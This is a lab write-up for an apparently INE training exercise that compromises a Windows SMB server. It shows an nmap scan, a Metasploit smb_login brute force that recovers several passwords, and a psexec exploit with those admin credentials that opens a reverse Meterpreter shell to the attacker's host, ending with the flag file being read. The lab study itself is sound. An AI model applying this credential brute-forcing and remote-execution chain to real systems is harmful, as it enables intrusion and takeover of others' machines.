## Windows: SMB Server PSexec

### Target
`demo.ine.local`

### Tools:
* `msf`
* `psexec`

### Objective: 
Exploit the SMB service and retrieve the flag!  

---
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn demo.ine.local -sC -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-20 02:53 IST
Nmap scan report for demo.ine.local (10.3.21.229)
Host is up (0.0076s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: EC2AMAZ-408S766
|   NetBIOS_Domain_Name: EC2AMAZ-408S766
|   NetBIOS_Computer_Name: EC2AMAZ-408S766
|   DNS_Domain_Name: EC2AMAZ-408S766
|   DNS_Computer_Name: EC2AMAZ-408S766
|   Product_Version: 10.0.14393
|_  System_Time: 2026-01-19T21:24:07+00:00
| ssl-cert: Subject: commonName=EC2AMAZ-408S766
| Not valid before: 2026-01-18T21:21:45
|_Not valid after:  2026-07-20T21:21:45
|_ssl-date: 2026-01-19T21:24:15+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:                                                                                                                                                                               
|   date: 2026-01-19T21:24:09
|_  start_date: 2026-01-19T21:21:44
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.68 seconds
```
first need to find passwords
```bash
msf6 > search smb_login

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_login  .                normal  No     SMB Login Check Scanner


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_login

msf6 > use 0
```
```bash
msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.3.21.229:445       - 10.3.21.229:445 - Success: '.\sysadmin:samantha'
[+] 10.3.21.229:445       - 10.3.21.229:445 - Success: '.\demo:victoria'
[+] 10.3.21.229:445       - 10.3.21.229:445 - Success: '.\auditor:elizabeth'
[+] 10.3.21.229:445       - 10.3.21.229:445 - Success: '.\administrator:qwertyuiop' Administrator
[*] demo.ine.local:445    - Scanned 1 of 1 hosts (100% complete)
[*] demo.ine.local:445    - Bruteforce completed, 4 credentials were successful.
[*] demo.ine.local:445    - You can open an SMB session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```
```bash
msf6 exploit(windows/smb/psexec) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 exploit(windows/smb/psexec) > set SMBUSER Administrator
SMBUSER => Administrator
msf6 exploit(windows/smb/psexec) > set SMBPASS qwertyuiop
SMBPASS => qwertyuiop
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.48.8:4444 
[*] 10.3.21.229:445 - Connecting to the server...
[*] 10.3.21.229:445 - Authenticating to 10.3.21.229:445 as user 'Administrator'...
[*] 10.3.21.229:445 - Selecting PowerShell target
[*] 10.3.21.229:445 - Executing the payload...
[+] 10.3.21.229:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176198 bytes) to 10.3.21.229
[*] Meterpreter session 1 opened (10.10.48.8:4444 -> 10.3.21.229:49776) at 2026-01-20 03:05:49 +0530

meterpreter > 
```
```bash
meterpreter > cd /
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2020-09-25 12:04:38 +0530  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2016-07-16 18:48:08 +0530  BOOTNXT
040777/rwxrwxrwx  8192    dir   2020-09-09 10:22:55 +0530  Boot
040777/rwxrwxrwx  0       dir   2016-10-18 07:29:39 +0530  Documents and Settings
040777/rwxrwxrwx  0       dir   2018-02-23 16:36:05 +0530  PerfLogs
040555/r-xr-xr-x  4096    dir   2017-12-14 02:30:56 +0530  Program Files
040777/rwxrwxrwx  4096    dir   2020-09-25 12:13:29 +0530  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2016-11-24 05:49:28 +0530  ProgramData
040777/rwxrwxrwx  0       dir   2016-10-18 07:31:27 +0530  Recovery
040777/rwxrwxrwx  0       dir   2020-09-25 11:43:59 +0530  System Volume Information
040555/r-xr-xr-x  4096    dir   2020-09-25 11:45:39 +0530  Users
040777/rwxrwxrwx  28672   dir   2020-09-25 11:44:14 +0530  Windows
040777/rwxrwxrwx  0       dir   2020-09-25 12:11:47 +0530  admin
100444/r--r--r--  388690  fil   2020-09-02 13:52:08 +0530  bootmgr
100666/rw-rw-rw-  32      fil   2020-09-25 12:11:35 +0530  flag.txt
000000/---------  0       fif   1970-01-01 05:30:00 +0530  pagefile.sys
040777/rwxrwxrwx  0       dir   2020-09-25 12:12:16 +0530  public

meterpreter > type flag.txt
[-] Unknown command: type. Run the help command for more details.
meterpreter > cat flag.txt
e0da81a9cd42b261bc9b90d15f780433meterpreter > 
```
Flag: **e0da81a9cd42b261bc9b90d15f780433**